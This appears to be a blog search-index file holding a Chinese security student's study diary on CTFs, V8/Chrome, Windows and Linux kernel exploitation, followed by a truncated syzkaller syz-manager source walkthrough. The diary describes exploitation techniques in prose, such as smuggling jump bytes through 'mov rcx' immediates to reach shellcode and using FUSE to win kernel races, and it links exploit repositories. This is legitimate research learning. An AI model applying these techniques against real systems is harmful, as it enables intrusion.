<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>diary</title>
    <url>/917bede2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>记录日常学习 &amp; 生活，随缘更新<br>（本想整个日记啥的插件的，想了想还是直接扔到一篇文章里得了）</p>
<h2 id="2022-6-11"><a href="#2022-6-11" class="headerlink" title="2022/6/11"></a>2022/6/11</h2><p>实习一个月了，搞 windows 内核，挺有意思的，学习了 win32kfull.sys 图形驱动的漏洞，以及 clfs 日志文件系统的漏洞，本想写点文章记录，想了想重复性工作太多了，就懒狗了。之前关于 linux 条件竞争的技巧想写文章，但其实说起来也就那样，不知道如何丰富内容，于是乎咕咕咕……</p>
<p>最近的状态都是：白天实习学 windows 内核漏洞利用，晚上看 《Linux Device Drivers》学习搞搞 linux 驱动开发，周末躺平摸鱼玩手机</p>
<p>2022 年也过去一半了，回顾下我目前为止都弃坑了什么东西以及学了什么东西吧</p>
<ol>
<li>弃坑浏览器 js 引擎的漏洞利用学习（主要是 v8），没啥兴趣了，不懂的太多了，挫败感太强了</li>
<li>更加深入的学习 linux 内核漏洞，就复现了些漏洞（主要是内核 UAF 这种利用起来我认为比较简单的洞），其实部分复现过的洞都写了文章</li>
<li>学算法，数据结构，算法刷了 leetcode 的剑指 Offer 的题库，后面又摸了，最近不想多开坑，就先搁置一下</li>
<li>每日背英语单词，曾经认为应付英语考试不需要背单词，事实也是如此，依靠仅有的语感在考试中确实也考得不错（四六级除外），现在不一样了，学英语不再是为了应付考试，只是为了能拥有这个外语能力，便于看技术文章，从背单词开始提升下英语能力（已经坚持了 42 天啦！）</li>
<li>因为实习而接触 windows 内核漏洞，还是非常有意思，涉及操作系统内核层面的东西都很有魅力，学到许多，尽管我对 windows 用户态的漏洞利用，逆向方面接触的很少，但是对于刚刚入门 windows 内核的我影响不算太大，后续啥不会学啥就行</li>
</ol>
<p>之后有打算再写点学习记录的文章，嗯~ 看情况吧，看看有没有想写的，以及看有没有精力</p>
<blockquote>
<p>不想更文章就会像现在这样，水个日记证明这个站还在</p>
</blockquote>
<span id="more"></span>

<h2 id="2022-3-30"><a href="#2022-3-30" class="headerlink" title="2022/3/30"></a>2022/3/30</h2><p>最近在学习 linux kernel，尝试复现一些真实的漏洞（<del>文章还没写 咕咕咕</del>）</p>
<p>在之前的内核中，常用到 userfaultfd 来提高条件竞争漏洞利用的成功率，但是在比较新的版本内核中，userfaultfd 的系统调用不能被普通用户所使用了，不过最近有利用 fuse 即用户态文件系统来提高条件竞争利用成功率的方法，具体可以看下面的文章：</p>
<ul>
<li><a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">https://www.willsroot.io/2022/01/cve-2022-0185.html</a></li>
<li>最近的一个 CVE，看 exp 也用了 fuse的东西，<a href="https://github.com/plummm/CVE-2022-27666">https://github.com/plummm/CVE-2022-27666</a><blockquote>
<p>之前在操作系统课程的学习过程中，对 fuse 这个东西有一些了解，看看能不能整理写一篇小文章</p>
</blockquote>
</li>
</ul>
<h2 id="2022-2-25"><a href="#2022-2-25" class="headerlink" title="2022/2/25"></a>2022/2/25</h2><p>寒假摸了，监督 HCTF-HGAME 线上赛，D<sup>3</sup>CTF 出题，测题，期间还跟着打打 CTF，学了下 MIT 的操作系统课程 6.S081，重新审视下 OS 这门课</p>
<p><del>v8 的连载文章，连载速度都比我勤奋</del></p>
<p>还暂缓返校，在家摸鱼，零碎时间搞学习，陆陆续续填坑（以及丢弃没必要的坑，专心于一两件事情</p>
<h2 id="2021-12-27"><a href="#2021-12-27" class="headerlink" title="2021/12/27"></a>2021/12/27</h2><p>学期末了，考试提前有点慌，忙着应付学业，以及经常摸鱼，很多东西没学上。总结下这两个月都干了啥吧</p>
<ul>
<li>零零散散学了点安卓，日常看看安全技术文章的推送</li>
<li>跟着 fuzzing101 做了几个 lab，感觉收获不大</li>
<li>看了看关于 v8 的一个比较友好的连载文章：<a href="https://www.anquanke.com/post/id/253048">https://www.anquanke.com/post/id/253048</a></li>
<li>打了场浙江省省赛，混了个一等奖</li>
<li>《加密与解密》看了一大半，不过这学期看不完了</li>
<li>《Effective Modern C++》 很早就看完了，还是非常不错的一本书</li>
<li>上周打了场 ByteCTF Final，0 输出了，wp 出来后复现了 6 道有意思的 mobile 题</li>
<li>昨天和今天打了场 SCTF，貌似大佬们都关注 kernel 啥的难题去了，没发现有两道只需要散装编译原理以及一些 bison 写词法分析和语法分析的知识就能做的题，分别混了个一血和二血，然后还有一道一血 ROP open read 爆破 flag 的题，今天围观队友上分，然后摸鱼</li>
<li>还打了几场比赛，emm,明明省赛过后该淡出了，可是看到队友人太少没法打，只好继续帮帮忙了</li>
</ul>
<h2 id="2021-10-21"><a href="#2021-10-21" class="headerlink" title="2021/10/21"></a>2021/10/21</h2><p>这学期感觉在多线程学习，啥都学，像回到了大一努力学习加入协会的样子</p>
<ul>
<li>《加密与解密》，才看了前四章，内容还比较基础，主要是工具的介绍还有简单的逆向技巧，希望能坚持看完</li>
<li>协会购书整了本《Effective Modern C++》，书不是很厚，今天一下午就看了几章了。这本书还是不错的，用非常简单的语言和例子讲述现代 C++ 常用的特性，如果只是学习了 C++ 语法皮毛，没怎么接触过现代 C++，例如把 C++ 当成 C with class，那么你一定需要这本书</li>
<li>前几天在 ByteCTF 初赛里遇到了 3 道安卓 pwn 题<em>（插句嘴：虽然分类是 pwn，但我认为这属于安卓逻辑漏洞吧）</em>，看了看赛前的技术分享，磕磕碰碰做出了其中两道，队友很猛，最后关头杀入前 20 进入决赛，<del>学弟妹们有机会去北京打线下了（老赛棍就不抢线下旅游机会了）</del>。借着这两道安卓题，最近也开始学安卓开发（是的，做出两道题的我一点也不会安卓），先学安卓开发，再搞安卓的安全问题</li>
<li>emmm，浏览器漏洞相关的学习，最近也没怎么深入接触呢，<del>这学期有的是时间</del>，都可以搞，都可以学！</li>
</ul>
<h2 id="2021-10-6"><a href="#2021-10-6" class="headerlink" title="2021/10/6"></a>2021/10/6</h2><ul>
<li>这几天给电脑配环境，尽量整得舒适点，整了很久，该开始进入学习技术的状态了</li>
<li>这学期打算学习《加密与解密》这本书，买了一直吃灰，也该看看了，希望不咕</li>
</ul>
<h2 id="2021-9-20"><a href="#2021-9-20" class="headerlink" title="2021/9/20"></a>2021/9/20</h2><ul>
<li>在9月17号结束了两个多月的实习，在暑假实习期间还是学到了东西，分析漏洞的时候，不仅要关注漏洞怎么利用本身，也要去学习软件开发者设计的思路，去理解为什么会产生这样的问题，从而去发现新的问题，以及思考怎么去规避这类问题的产生，蛮有意思的，在安全这方面还有很长的路要走呢。</li>
<li>今天也是回到学校的第二天了，中秋放假，这两天也是在摸鱼，还没想好这学期要干点什么，先等等上课吧</li>
</ul>
<h2 id="2021-9-7"><a href="#2021-9-7" class="headerlink" title="2021/9/7"></a>2021/9/7</h2><ul>
<li>回顾 2020 参加的 RCTF 的一道 pwn 题，看上古学长的 wp：<br><a href="https://1ce0ear.github.io/2020/06/11/rctf2020-pwn-golang-interface/；">https://1ce0ear.github.io/2020/06/11/rctf2020-pwn-golang-interface/；</a><br>利用 golang 的条件竞争 bug 来绕过沙箱进行任意代码执行，文章里面还贴了 Nu1l 战队的 wp，其中有个地方很有意思，利用 <code>mov rcx, 0x05eb909090909090</code> 生成的汇编有 <code>\x48\xb9\x90\x90\x90\x90\x90\x90\xeb\x05</code>，只要能控制 pc 到 <code>\x48\xb9</code> 之后的位置，就可以任意执行 <code>0x05eb909090909090</code> 构成的代码，利用 golang 返回整数数组的语句来大量生成这样的语句，再控制 pc 就比较方便地任意执行代码了，wp 使用了这些注入的代码来调用 mprotect 然后再跳到 shellcode 中执行更复杂的代码</li>
</ul>
<h2 id="2021-8-31"><a href="#2021-8-31" class="headerlink" title="2021/8/31"></a>2021/8/31</h2><ul>
<li>最近看了看 <em>IDAPython Book</em>，学习 idapython 怎么写</li>
<li>昨天玄武实验室的推送有一篇关于基于断点的二进制程序 fuzzer，很有意思：<a href="https://conference.hitb.org/hitbsecconf2021sin/materials/D2T2%20-%20trapfuzzer-%20Coverage-guided%20Binary%20Fuzzing%20with%20Breakpoints%20-%20Sili%20Luo.pdf">https://conference.hitb.org/hitbsecconf2021sin/materials/D2T2%20-%20trapfuzzer-%20Coverage-guided%20Binary%20Fuzzing%20with%20Breakpoints%20-%20Sili%20Luo.pdf</a></li>
<li>2021 InCTF DeadlyFastGraph 的 writeup 之前看得比较粗糙，今天找了点时间复现完了，准备写篇文章，毕竟是第一次接触 WebKit 整 jsc 的利用</li>
<li>chromium issues 1062091 的学习，之前的 leak gadget 偏移问题已经不重要了，我想到了别的 leak 方法。然后又遇到没符号的问题，然后才发现 .pdb 文件可以下载。顺带一提，可以从下面第一个链接根据版本号查 <em>Branch Base Position</em>，然后去第二个链接找对应平台的二进制包以及符号文件：<ol>
<li><a href="https://omahaproxy.appspot.com/">https://omahaproxy.appspot.com/</a></li>
<li><a href="https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html">https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html</a></li>
<li>例如 81.0.4044.69 版本的 chromium<br><a href="https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/737173/">https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/737173/</a>  chrome-win32-syms.zip 就是符号文件，之前一直以为 win32 对应的是 32 位系统的符号文件就没在意</li>
</ol>
</li>
</ul>
<p>（ghidra 分析 chrome.dll 卡了一下午）</p>
<h2 id="2021-8-27"><a href="#2021-8-27" class="headerlink" title="2021/8/27"></a>2021/8/27</h2><ul>
<li><a href="https://interrupt.memfault.com/blog/advanced-gdb">https://interrupt.memfault.com/blog/advanced-gdb</a> 从玄武实验室公众号推送看到的，gdb 的一些高级用法，有些技巧还是很有用的</li>
<li>复现了一下 2020ductf（downunderctf）的一道 v8 题目，这个比 2019 starctf 的 oob 还要简单，任意数组越界两个单位，exp 很快就写好了，就不详细写文章了，利用方式和 starctf 的 oob 差不多，题目地址：<br><a href="https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/pwn/is-this-pwn-or-web/challenge">https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/pwn/is-this-pwn-or-web/challenge</a></li>
</ul>
<h2 id="2021-8-25"><a href="#2021-8-25" class="headerlink" title="2021/8/25"></a>2021/8/25</h2><ul>
<li>近两天在学习这个洞的利用方法，思路看懂了，但作者的 exp 的偏移好像都不对啊，没符号，正在想办法自己找偏移：<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1062091">https://bugs.chromium.org/p/chromium/issues/detail?id=1062091</a></li>
<li>fuzzing 教程 <a href="https://github.com/antonio-morales/Fuzzing101">https://github.com/antonio-morales/Fuzzing101</a> </li>
<li><a href="https://github.com/ventoy/Ventoy">https://github.com/ventoy/Ventoy</a> 制作可启动U盘的工具，这个和 winsetupfromusb 工具一样，都可以引导多个镜像，但这个更方便，只要拷贝镜像进 U 盘就行</li>
<li>跟着教程 <a href="https://github.com/lotabout/write-a-C-interpreter">https://github.com/lotabout/write-a-C-interpreter</a> 学着写一个 C 语言解释器，bug 频出，有些许东西看不太懂，编译原理果然还是硬核知识</li>
</ul>
<h2 id="2021-8-19"><a href="#2021-8-19" class="headerlink" title="2021/8/19"></a>2021/8/19</h2><ul>
<li>glibc一个很旧的漏洞的分析文章：<a href="https://www.anquanke.com/post/id/250852">https://www.anquanke.com/post/id/250852</a></li>
<li>看玄武实验室公众号的推送：<ul>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2197">https://bugs.chromium.org/p/project-zero/issues/detail?id=2197</a> chrome 的一个比较新的漏洞，简单看了下，之后搭一下环境看看能不能写个利用<ul>
<li><a href="https://github.com/uxmal/reko">https://github.com/uxmal/reko</a> 开源的反汇编工具</li>
</ul>
</li>
</ul>
</li>
<li>2021 InCTF DeadlyFastGraph 的 WriteUp： <a href="https://blog.bi0s.in/2021/08/15/Pwn/InCTFi21-DeadlyFastGraph/">https://blog.bi0s.in/2021/08/15/Pwn/InCTFi21-DeadlyFastGraph/</a></li>
<li>逛 github：<ul>
<li><a href="https://github.com/managarm/managarm">https://github.com/managarm/managarm</a> 微内核架构的64位多核操作系统<ul>
<li><a href="https://github.com/lotabout/write-a-C-interpreter">https://github.com/lotabout/write-a-C-interpreter</a> 用 C 语言编写 C 语言解释器的教程</li>
<li><a href="https://github.com/liexusong/linux-source-code-analyze">https://github.com/liexusong/linux-source-code-analyze</a> linux 源码分析的文章</li>
<li><a href="https://github.com/0voice/linux_kernel_wiki">https://github.com/0voice/linux_kernel_wiki</a> linux 内核学习资料（收藏永不停止，学习从未开始哈哈哈）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="2021-8-18"><a href="#2021-8-18" class="headerlink" title="2021/8/18"></a>2021/8/18</h2><ul>
<li>发现个有意思的项目：<a href="https://github.com/robertkrimen/otto">https://github.com/robertkrimen/otto</a></li>
<li>正打算分析下这个洞： <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1062091">https://bugs.chromium.org/p/chromium/issues/detail?id=1062091</a></li>
</ul>
<h2 id="2021-8-16"><a href="#2021-8-16" class="headerlink" title="2021/8/16"></a>2021/8/16</h2><p>今天没啥可以分享的技术上的东西</p>
<ul>
<li>继续看 v8 源码，越看越深，有点脑昏了</li>
<li>上周末搬家完毕，还没调整好状态，感觉现在就是在熬生活</li>
</ul>
<h2 id="2021-8-12"><a href="#2021-8-12" class="headerlink" title="2021/8/12"></a>2021/8/12</h2><ul>
<li>公司上班真好，又有环境了，继续分析漏洞，又是进展大大的一天</li>
<li>最近主要都在阅读 v8 编译优化部分的源码，找机会整理一下</li>
<li>没完整学过编译原理真的吃亏，无意中查了一直看不懂代码的函数名，才发现是编译原理的东西，小小的补一下（大脑里只有散装的编译原理）：</li>
<li>支配树相关：<a href="https://blog.csdn.net/dashuniuniu/article/details/52224882">https://blog.csdn.net/dashuniuniu/article/details/52224882</a></li>
<li>构造支配树的一种方法：<a href="https://www.cs.rice.edu/~keith/EMBED/dom.pdf">https://www.cs.rice.edu/~keith/EMBED/dom.pdf</a></li>
</ul>
<h2 id="2021-8-11"><a href="#2021-8-11" class="headerlink" title="2021/8/11"></a>2021/8/11</h2><ul>
<li>居家办公，电脑上的环境不全，就没有继续分析漏洞了，学习了一天的 codeql</li>
<li>非常有意思的 codeql 课程 <a href="https://lab.github.com/githubtraining/codeql-u-boot-challenge-(cc++)">https://lab.github.com/githubtraining/codeql-u-boot-challenge-(cc++)</a></li>
<li><a href="https://securitylab.github.com/ctf/">https://securitylab.github.com/ctf/</a></li>
<li>看玄武实验室公众号每日推送，有两个关于利用 codeql 挖掘漏洞的链接<br><a href="https://securitylab.github.com/research/NSA-emissary/">https://securitylab.github.com/research/NSA-emissary/</a><br><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Leecraso-Put-In-One-Bug-And-Pop-Out-More-An-Effective-Way-Of-Bug-Hunting-In-Chrome.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Leecraso-Put-In-One-Bug-And-Pop-Out-More-An-Effective-Way-Of-Bug-Hunting-In-Chrome.pdf</a> （这个其实就是上周看的 blackhat 360 alpha lab 的演讲分享）</li>
</ul>
<h2 id="2021-8-10"><a href="#2021-8-10" class="headerlink" title="2021/8/10"></a>2021/8/10</h2><ul>
<li>被租房突发问题搞崩心态了，今天就继续分析漏洞，然后没怎么干其它事情了</li>
<li>简单补补 turbofan 的知识<br><a href="https://docs.google.com/document/d/1aeUugkWCF1biPB4tTZ2KT3mmRSDV785yWZhwzlJe5xY/edit#">https://docs.google.com/document/d/1aeUugkWCF1biPB4tTZ2KT3mmRSDV785yWZhwzlJe5xY/edit#</a> &lt;– 太底层了，好像没什么用(2021/8/13)<br><a href="https://benediktmeurer.de/2016/11/25/v8-behind-the-scenes-november-edition">https://benediktmeurer.de/2016/11/25/v8-behind-the-scenes-november-edition</a></li>
</ul>
<h2 id="2021-8-9"><a href="#2021-8-9" class="headerlink" title="2021/8/9"></a>2021/8/9</h2><p>（周末一直宅着摸鱼，太惭愧了）</p>
<ul>
<li>继续分析之前 v8 漏洞（emmm，毕竟是工作内容，好像不能说太多），看了一整天的源码，思绪高涨，发现了很多没注意的细节，然后又卡壳了</li>
<li>参考了 Sakura 前辈的文章：<a href="https://buaq.net/go-33711.html">https://buaq.net/go-33711.html</a> （这篇文章搬运自 Sakura 前辈的博客，但是在前辈的博客上找不到原文了），看了这篇文章消除了之前对 Node 的 <code>use</code> 结点的困惑，大致就是有边 A-&gt;B，A 是 B 的 input，B 是 A 的 use</li>
<li>RARctf 上线看了下题，貌似不是很难，逆了一下一道题，把 ida 的分析文件交给学弟就下线了</li>
</ul>
<h2 id="2021-8-6"><a href="#2021-8-6" class="headerlink" title="2021/8/6"></a>2021/8/6</h2><p>第一记，顺带总结下之前几天的事情</p>
<ul>
<li><p>上次复现 Google ctf 的题目，在调试 release 版 chrome 的时候没法断在 v8 的进程里，第二天就找到解决方法了，本想总结一篇文章，但是太简略了没必要，简述就是启动 chrome 的时候加上参数 <code>--renderer-startup-dialog</code>，这样 chrome 的渲染进程（v8 引擎所在进程）会暂停，<code>ps | grep chrome</code> 找到启动参数带有 <code>--type=renderer</code> 的 chrome 进程，这个就是负责解析 js 的进程，gdb attach 上去，设置好断点什么的，continue 就行了</p>
</li>
<li><p>实习从开始分析了个 v8 漏洞，太菜了，重点没找准，还在继续分析（今天实验室的大佬给我指点迷津，分析的漏洞又有新头绪了）</p>
</li>
<li><p>最近在看 chrome Mojo 的东西，跟着文档写 demo，看看相关的漏洞。在 <a href="https://github.com/allpaca/chrome-sbx-db">https://github.com/allpaca/chrome-sbx-db</a> 上看了下几个 UAF 的 issues，有些 UAF 都和类成员维护了一个 RenderFrameHost 对象的裸指针有关，这个指针会在页面关闭的时候释放，但是维护这个指针的类对象（基本是 Mojo 的 interface）的生命周期有可能未结束，之后在这个类对象使用该裸指针的时候就会造成 UAF，尝试着用这个特点去审计了一下源码找找有没有相似的问题（当然莫得发现）</p>
</li>
<li><p>今天看了 360 Alpha Lab 在 blackhat 上的演讲ppt <a href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Leecraso-Put-In-One-Bug-And-Pop-Out-More-An-Effective-Way-Of-Bug-Hunting-In-Chrome.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Leecraso-Put-In-One-Bug-And-Pop-Out-More-An-Effective-Way-Of-Bug-Hunting-In-Chrome.pdf</a> ，这里就提到了 Mojo 相关的类维护一个 RenderFrameHost 对象的裸指针造成的 UAF 问题，以及如何使用 Codeql（好东西）去发现相似的问题。回头看看之前的 UAF，原来有几个都是 Alpha Lab 报告的，学到许多。ppt 后半部分没看懂，太菜了我</p>
</li>
<li><p>还看了点 fuzz 的东西，学习下原理，emmm，发现 fuzz，符号执行，污点分析好像都多少和编译原理沾边，编译原理没完整学过，有点难理解</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>syzkaller 源码阅读笔记 —— syz-manager</title>
    <url>/2663df8d/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>syzkaller 中的 syz-manager 负责管理虚拟机，监控 crash，以及复现 crash</p>
<span id="more"></span>

<h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><p>从 main 函数开始，解析参数，加载 config 文件，随后调用 <code>RunManager</code> </p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// syz-manager/manager.go</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> prog<span class="token punctuation">.</span>GitRevision <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>
		log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">"bad syz-manager build: build with make, run bin/syz-manager"</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
	flag<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	log<span class="token punctuation">.</span><span class="token function">EnableLogCaching</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">20</span><span class="token punctuation">)</span>
	cfg<span class="token punctuation">,</span> err <span class="token operator">:=</span> mgrconfig<span class="token punctuation">.</span><span class="token function">LoadFile</span><span class="token punctuation">(</span><span class="token operator">*</span>flagConfig<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">"%v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
	<span class="token function">RunManager</span><span class="token punctuation">(</span>cfg<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="RunManager"><a href="#RunManager" class="headerlink" title="RunManager"></a>RunManager</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// syz-manager/manager.go</span>

<span class="token keyword">func</span> <span class="token function">RunManager</span><span class="token punctuation">(</span>cfg <span class="token operator">*</span>mgrconfig<span class="token punctuation">.</span>Config<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">var</span> vmPool <span class="token operator">*</span>vm<span class="token punctuation">.</span>Pool
	<span class="token comment">// Type "none" is a special case for debugging/development when manager</span>
	<span class="token comment">// does not start any VMs, but instead you start them manually</span>
	<span class="token comment">// and start syz-fuzzer there.</span>
	<span class="token keyword">if</span> cfg<span class="token punctuation">.</span>Type <span class="token operator">!=</span> <span class="token string">"none"</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">var</span> err <span class="token builtin">error</span>
		vmPool<span class="token punctuation">,</span> err <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span>cfg<span class="token punctuation">,</span> <span class="token operator">*</span>flagDebug<span class="token punctuation">)</span> <span class="token comment">// 「1」</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
			log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">"%v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>

	crashdir <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>cfg<span class="token punctuation">.</span>Workdir<span class="token punctuation">,</span> <span class="token string">"crashes"</span><span class="token punctuation">)</span>
	osutil<span class="token punctuation">.</span><span class="token function">MkdirAll</span><span class="token punctuation">(</span>crashdir<span class="token punctuation">)</span>

	reporter<span class="token punctuation">,</span> err <span class="token operator">:=</span> report<span class="token punctuation">.</span><span class="token function">NewReporter</span><span class="token punctuation">(</span>cfg<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">"%v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>

	mgr <span class="token operator">:=</span> <span class="token operator">&amp;</span>Manager<span class="token punctuation">&#123;</span>
		cfg<span class="token punctuation">:</span>              cfg<span class="token punctuation">,</span>
		vmPool<span class="token punctuation">:</span>           vmPool<span class="token punctuation">,</span>
		<span class="token comment">//...</span>
	<span class="token punctuation">&#125;</span>

	mgr<span class="token punctuation">.</span><span class="token function">preloadCorpus</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	mgr<span class="token punctuation">.</span><span class="token function">initStats</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// Initializes prometheus variables.</span>
	mgr<span class="token punctuation">.</span><span class="token function">initHTTP</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">// Creates HTTP server.</span>
	mgr<span class="token punctuation">.</span><span class="token function">collectUsedFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

	<span class="token comment">// Create RPC server for fuzzers.</span>
	mgr<span class="token punctuation">.</span>serv<span class="token punctuation">,</span> err <span class="token operator">=</span> <span class="token function">startRPCServer</span><span class="token punctuation">(</span>mgr<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">"failed to create rpc server: %v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> cfg<span class="token punctuation">.</span>DashboardAddr <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>
		<span class="token comment">// ...</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 「2」</span>
		<span class="token keyword">for</span> lastTime <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token punctuation">&#123;</span>
			time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span>
			now <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
			diff <span class="token operator">:=</span> now<span class="token punctuation">.</span><span class="token function">Sub</span><span class="token punctuation">(</span>lastTime<span class="token punctuation">)</span>
			lastTime <span class="token operator">=</span> now
			mgr<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
			<span class="token keyword">if</span> mgr<span class="token punctuation">.</span>firstConnect<span class="token punctuation">.</span><span class="token function">IsZero</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				mgr<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
				<span class="token keyword">continue</span>
			<span class="token punctuation">&#125;</span>
			mgr<span class="token punctuation">.</span>fuzzingTime <span class="token operator">+=</span> diff <span class="token operator">*</span> time<span class="token punctuation">.</span><span class="token function">Duration</span><span class="token punctuation">(</span>atomic<span class="token punctuation">.</span><span class="token function">LoadUint32</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mgr<span class="token punctuation">.</span>numFuzzing<span class="token punctuation">)</span><span class="token punctuation">)</span>
			executed <span class="token operator">:=</span> mgr<span class="token punctuation">.</span>stats<span class="token punctuation">.</span>execTotal<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
			crashes <span class="token operator">:=</span> mgr<span class="token punctuation">.</span>stats<span class="token punctuation">.</span>crashes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
			corpusCover <span class="token operator">:=</span> mgr<span class="token punctuation">.</span>stats<span class="token punctuation">.</span>corpusCover<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
			corpusSignal <span class="token operator">:=</span> mgr<span class="token punctuation">.</span>stats<span class="token punctuation">.</span>corpusSignal<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
			maxSignal <span class="token operator">:=</span> mgr<span class="token punctuation">.</span>stats<span class="token punctuation">.</span>maxSignal<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
			mgr<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
			numReproducing <span class="token operator">:=</span> atomic<span class="token punctuation">.</span><span class="token function">LoadUint32</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mgr<span class="token punctuation">.</span>numReproducing<span class="token punctuation">)</span>
			numFuzzing <span class="token operator">:=</span> atomic<span class="token punctuation">.</span><span class="token function">LoadUint32</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mgr<span class="token punctuation">.</span>numFuzzing<span class="token punctuation">)</span>

			log<span class="token punctuation">.</span><span class="token function">Logf</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"VMs %v, executed %v, cover %v, signal %v/%v, crashes %v, repro %v"</span><span class="token punctuation">,</span>
